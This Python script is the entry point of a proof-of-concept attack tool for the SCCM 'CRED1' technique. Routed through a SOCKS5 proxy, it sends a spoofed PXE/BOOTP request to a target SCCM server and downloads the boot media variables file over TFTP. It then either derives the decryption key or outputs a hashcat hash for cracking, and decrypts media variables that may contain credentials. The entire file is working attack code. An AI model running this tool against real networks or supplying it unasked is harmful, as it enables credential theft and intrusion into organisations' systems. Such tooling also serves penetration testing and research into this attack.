from lib import sccm
from lib import socks, tftp
import argparse

# Parse arguments
parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
subparsers = parser.add_subparsers(dest="mode")

# Main attack mode (default when no subcommand)
attack_parser = subparsers.add_parser("attack", help="Run the CRED1 attack against a PXE server")
attack_parser.add_argument("target", help="SCCM PXE IP")
attack_parser.add_argument("src_ip", help="Source IP")
attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)

# Decrypt mode — decrypt a local .boot.var file with a key
decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a locally downloaded .boot.var file")
decrypt_parser.add_argument("file", help="Path to the .boot.var file")
decrypt_parser.add_argument("key", help="Decryption key (hex)")

args = parser.parse_args()

# For backwards compatibility: if no subcommand, treat positional args as attack mode
if args.mode is None:
    attack_parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
    attack_parser.add_argument("target", help="SCCM PXE IP")
    attack_parser.add_argument("src_ip", help="Source IP")
    attack_parser.add_argument("socks_host", help="SOCKS5 proxy host")
    attack_parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
    attack_parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
    args = attack_parser.parse_args()
    args.mode = "attack"

if args.mode == "decrypt":
    # Decrypt a local file with the given key
    sccm_client = sccm.SCCM(None, None, None)
    try:
        with open(args.file, "rb") as f:
            filedata = f.read()
        print(f"[*] File size: {len(filedata)} bytes")
        aes_bits = sccm_client.detect_encryption_type(filedata)
        print(f"[*] Encryption: AES-{aes_bits}" if aes_bits else "[!] Unknown encryption type in header")
        key_bytes = bytes.fromhex(args.key)
        decrypted = sccm_client.decrypt_media_file(filedata, key_bytes)
        print("[*] Decrypted media variables:")
        print(decrypted)
    except Exception as e:
        print(f"[!] Decryption failed: {e}")
    exit()

# Attack mode
if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
    print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
    exit()

# Setup SOCKS5 client
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

sccm_client = sccm.SCCM(args.target, 4011, client)
(variables,bcd,cryptokey) = sccm_client.send_bootp_request(args.src_ip, "11:22:33:44:55:66")

print(f"[*] Variables file: {variables}")
print(f"[*] BCD file: {bcd}")

client.close()

# Download the variables file via TFTP
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

tftp_client = tftp.TFTPClient(args.target, 69, client)
data_variables = tftp_client.get_file(variables)

if data_variables is None:
    print("[!] TFTP download failed — file must be retrieved manually")
    print(f"[*] Download the variables file from: \\\\{args.target}\\REMINST{variables}")
    if cryptokey is not None:
        print("[*] No PXE password set (crypto key found in DHCP response)")
        decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
        if decrypt_password:
            print(f"[*] Derived key: {decrypt_password.hex()}")
            print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> {decrypt_password.hex()}")
    else:
        print("[*] PXE media is password-protected (no crypto key in DHCP response)")
        print("[*] Then decrypt with: python3 main.py decrypt <variables_file> <cracked_password_hex>")
    exit()

if cryptokey is None:
    # Password IS set — no crypto key in DHCP response, need to crack the hash
    print("[*] PXE media is password-protected (no crypto key in DHCP response)")
    aes_bits = sccm_client.detect_encryption_type(data_variables)
    aes_label = f"aes{aes_bits}" if aes_bits else "aes128"
    print(f"[*] Detected encryption: AES-{aes_bits or 128}")
    hashcat_hash = f"$sccm${aes_label}${sccm_client.read_media_variable_file_header(data_variables).hex()}"

    if args.password:
        print("[*] Decrypting media file with supplied password...")
        try:
            password_bytes = bytes.fromhex(args.password)
            decrypted = sccm_client.decrypt_media_file(data_variables, password_bytes)
            print("[*] Decrypted media variables:")
            print(decrypted)
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
            print(f"[*] You can also download the file manually from: \\\\{args.target}\\REMINST{variables}")
    else:
        print("[*] Hashcat hash:")
        print(hashcat_hash)
        print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
        print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
        print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> <cracked_password_hex>")
else:
    # No password set — crypto key IS in the DHCP response, can decrypt directly
    print("[*] No PXE password set (crypto key found in DHCP response)")
    print("[*] Deriving decryption key...")
    decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
    if decrypt_password:
        print("[*] Derived key: " + decrypt_password.hex())
        try:
            decrypted = sccm_client.decrypt_media_file(data_variables, decrypt_password)
            print("[*] Decrypted media variables:")
            print(decrypted)
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
            print(f"[*] Download the variables file manually from: \\\\{args.target}\\REMINST{variables}")
            print(f"[*] Then decrypt with: python3 main.py decrypt <variables_file> {decrypt_password.hex()}")
